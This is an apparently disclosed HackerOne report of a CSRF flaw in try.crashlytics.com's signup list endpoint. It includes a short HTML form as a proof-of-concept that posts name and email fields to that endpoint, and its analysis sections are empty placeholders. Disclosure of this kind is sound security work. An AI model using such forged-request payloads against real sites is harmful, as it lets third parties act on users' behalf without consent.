---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '13856'
original_report_id: '13856'
title: CSRF   in crashlytics.com
weakness: Cross-Site Request Forgery (CSRF)
team_handle: x
created_at: '2014-05-28T20:30:28.760Z'
disclosed_at: '2014-09-08T14:55:13.327Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF   in crashlytics.com

## Metadata

- HackerOne Report ID: 13856
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: x
- Disclosed At: 2014-09-08T14:55:13.327Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hello Sir 

This is N B Sri Harsha 

I Have Found An  CSRF  in  http://try.crashlytics.com/


POC ;- 

<form method="POST" action="http://try.crashlytics.com/list/" class="validatable" id="beta_form">
                                <input id="validate" class="clear validate validate-name validate-message" placeholder="your name" name="name" type="text">
                                <input id="validate" class="clear validate validate-message" placeholder="name@server.com" name="email" type="text">
                                <input name="sitereferral" value="" type="hidden">
                                <input value="" id="emailVerify" type="submit">
                            </form>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
